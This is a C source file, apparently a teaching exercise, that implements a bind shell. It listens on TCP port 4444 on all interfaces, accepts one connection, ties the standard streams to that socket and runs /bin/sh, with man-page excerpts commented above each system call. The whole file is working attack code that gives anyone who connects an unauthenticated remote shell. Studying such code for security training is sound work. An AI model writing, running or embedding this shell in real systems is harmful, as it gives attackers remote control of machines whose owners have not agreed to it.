#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>

int main(void)
{

	int sock_file_des, clientfd;
	struct sockaddr_in sock_ad; 	
//[1]we need to create the socket connection using socket call function

//[*]Man page for socket call
//----->int socket(int domain, int type, int protocol);
// 	domain = AF_INET (IPv4 Internet protocol  family  which will be used for communication)
//	type   = SOCK_STREAM (Provides sequenced, reliable, two-way, connection-based byte  streams.  An out-of-band data transmission mechanism may be supported
//	protocol = 0 (The protocol specifies a particular protocol to be used with the socket.Normally only a single protocol exists to support a particular socket  type within a given protocol family, in which case protocol can be specified as 0.

	sock_file_des = socket(AF_INET, SOCK_STREAM, 0);
	
//[2]Binds the socket to localhost and port (here will use 4444) using bind call.

//[*]Man page for bind call
//------->int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
//	   sockfd = sock_file_des
//	   const struct sockaddr *addr = (struct sockaddr *)&sock_ad (bind() assigns the address specified to by addr to the socket referred to by the file descriptor sockfd)
//	   socklen_t addrlen = sizeof(sock_ad) (addrlen specifies  the  size,  in bytes, of the address structure pointed to by addr.)

	sock_ad.sin_family = AF_INET; // Host byte order.(2)
	sock_ad.sin_port = htons(4444);// network byte order
	sock_ad.sin_addr.s_addr = INADDR_ANY;//(0)bindshell will listen on any address

	bind(sock_file_des, (struct sockaddr *) &sock_ad, sizeof(sock_ad));


//[3]Waits for incoming connection using call to listen

//[*]Man page for listen call
//------->int listen(int sockfd, int backlog);
//	sockfd = sock_file_des (The sockfd argument is a file descriptor that refers to a socket of type SOCK_STREAM)
//	backlog = 0 (The backlog argument defines the maximum length to which the queue of pending connections for sockfd  may  grow)


	listen(sock_file_des, 0);

//[4]Accept the connection using call to accept

//[*]Man page to accept call
//------->int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
//	sockfd = sock_file_des
//	struct sockaddr *addr = NULL (The  argument  addr is a pointer to a sockaddr structure.  This structure is filled in with the address of the peer socket, as known to the communications layer.When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL.
//	socklen_t *addrlen = NULL


	clientfd = accept(sock_file_des, NULL, NULL);

//[5]Redirect file descriptors (STDIN, STDOUT and STDERR) to the socket using DUP2

//[*]Man page for dup2 (duplicate a file descriptor)
//------->int dup2(int oldfd, int newfd);
//	oldfd = clientfd
//	newfd = 0(stdin) , 1(stdout), 2(stderr)
	
	dup2(clientfd, 0); //	stdin
	dup2(clientfd, 1); //	stdout
	dup2(clientfd, 2); //	stderr

//[6]Execute shell (here we use /bin/sh) using execve call

//[*]Man page for execve call
//------->int execve(const char *filename, char *const argv[],char *const envp[]);
//	char *filename = /bin/sh
//	char *const argv[] = NULL
//	char *const envp[] = NULL

	execve("/bin/sh",NULL,NULL);
	
}

